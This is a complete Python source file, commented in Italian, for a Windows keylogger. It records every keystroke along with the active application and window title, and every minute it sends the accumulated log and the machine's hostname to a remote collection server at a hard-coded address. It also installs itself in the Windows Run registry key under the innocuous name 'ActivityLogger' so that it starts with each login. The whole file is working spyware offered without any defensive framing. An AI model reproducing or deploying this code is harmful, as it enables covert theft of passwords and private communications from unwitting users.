import os
import datetime
import keyboard
import win32gui
import win32process
import psutil
import sys
import winreg as reg
import requests
import json
import socket
from threading import Timer
import logging

# Configurazione
UPDATE_INTERVAL = 60  # Invia al server ogni 60 secondi
SERVER_URL = "http://192.168.1.8:5000/log"  # URL del server

# Configurazione logging per debug
LOG_FILE = os.path.join(os.path.expanduser("~"), "Documents", "keylogger_debug.log")
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w"):
        pass

logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format="%(asctime)s - %(levelname)s - %(message)s",
)


class KeyLogger:
    def __init__(self):
        self.log = ""  # I log che vengono salvati sul server
        self.current_window = ""
        self.pc_name = socket.gethostname()
        logging.info(
            f"KeyLogger inizializzato sul PC: {self.pc_name}"
        )  #! Log che vengono salvati sul client PER DEBBUGING

    def callback(self, event):
        """Callback che viene chiamato ad ogni pressione di tasto"""
        name = event.name

        # Ignora i tasti speciali
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "tab":
                name = "[TAB]"
            elif name == "backspace":
                name = "[BACKSPACE]"
            else:
                name = f"[{name.upper()}]"

        # Ottieni informazione sulla finestra attuale
        window = self.get_current_window()
        if window != self.current_window:
            self.current_window = window
            self.log += f"\n\n[{datetime.datetime.now()}] Finestra: {window}\n"

        # Aggiungi il tasto al log
        self.log += name

    def get_current_window(self):
        """Ottiene il nome della finestra e dell'applicazione attualmente attive"""
        try:
            hwnd = win32gui.GetForegroundWindow()
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            try:
                process = psutil.Process(pid)
                process_name = process.name()
                window_title = win32gui.GetWindowText(hwnd)
                return f"{process_name} - {window_title}"
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                return "Sconosciuto"
        except:
            return "Sconosciuto"

    def send_to_server(self):
        """Carica i dati di log sul server e pianifica il prossimo aggiornamento"""
        if self.log:
            try:
                # Creare una struttura JSON adeguata
                payload = {
                    "log": self.log,
                    "pc_name": self.pc_name,
                    "timestamp": str(datetime.datetime.now()),
                }

                logging.debug(f"Tentativo di invio dati: {len(self.log)} caratteri")

                # Invia i dati come JSON
                r = requests.post(
                    SERVER_URL,
                    json=payload,
                    headers={"Content-Type": "application/json"},
                )

                if r.ok:
                    logging.info(f"Dati inviati con successo: {r.status_code}")
                    logging.debug(f"Risposta server: {r.text}")
                    self.log = ""  # Pulisci il log solo se l'invio è riuscito
                else:
                    logging.error(f"Errore server: {r.status_code} - {r.text}")
            except Exception as e:
                logging.error(f"Errore durante invio al server: {str(e)}")
                # Non pulire il log in caso di errore per riprovare al prossimo invio
        else:
            logging.debug("Nessun dato da inviare")

        # Pianifica il prossimo aggiornamento
        timer = Timer(UPDATE_INTERVAL, self.send_to_server)
        timer.daemon = True
        timer.start()

    def start(self):
        """Avvia il keylogger"""
        start_message = f"\n\n=== INIZIO SESSIONE {datetime.datetime.now()} - PC: {self.pc_name} ===\n\n"
        self.log += start_message
        logging.info(start_message)

        try:
            # Avvia l'invio periodico dei dati al server
            self.send_to_server()

            # Avvia l'ascolto degli eventi tastiera
            keyboard.on_release(callback=self.callback)
            logging.info("Keylogger avviato con successo")
            keyboard.wait()
        except Exception as e:
            logging.critical(f"Errore nell'avvio del keylogger: {str(e)}")


def add_to_startup():
    """Aggiunge il programma all'avvio automatico di Windows"""
    try:
        # Percorso del file eseguibile (se compilato con PyInstaller)
        exe_path = sys.executable

        logging.info(f"Percorso eseguibile: {exe_path}")

        # Se è in modalità script, punta al file py
        if exe_path.endswith("python.exe"):
            script_path = os.path.abspath(__file__)
            exe_path = f'"{exe_path}" "{script_path}"'
            logging.info(f"Script path: {script_path}")

        # Apri la chiave di registro di avvio
        key = reg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"

        # Apri la chiave con permessi di scrittura
        reg_key = reg.OpenKey(key, key_path, 0, reg.KEY_WRITE)

        # Imposta il valore della chiave
        reg.SetValueEx(reg_key, "ActivityLogger", 0, reg.REG_SZ, exe_path)

        # Chiudi la chiave
        reg.CloseKey(reg_key)
        logging.info("Aggiunto con successo all'avvio automatico")
        return True
    except Exception as e:
        logging.error(f"Errore nell'aggiunta all'avvio: {str(e)}")
        return False


if __name__ == "__main__":
    try:
        # Crea un file di log separato per debug
        logging.info("=== AVVIO APPLICAZIONE ===")

        # Aggiungi il programma all'avvio automatico
        add_to_startup()

        # Avvia il keylogger
        keylogger = KeyLogger()
        keylogger.start()
    except Exception as e:
        logging.critical(f"Errore critico all'avvio: {str(e)}")
